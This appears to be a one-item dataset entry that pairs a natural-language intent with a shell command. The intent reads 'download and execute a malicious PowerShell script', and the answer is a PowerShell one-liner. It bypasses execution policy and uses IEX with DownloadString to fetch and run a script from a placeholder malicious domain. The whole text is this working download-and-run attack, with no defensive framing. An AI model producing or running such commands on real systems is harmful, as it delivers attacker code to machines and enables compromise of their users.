# Natural language intent:
# Download and execute a malicious PowerShell script from a specific domain.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/your_malicious_script.ps1')"
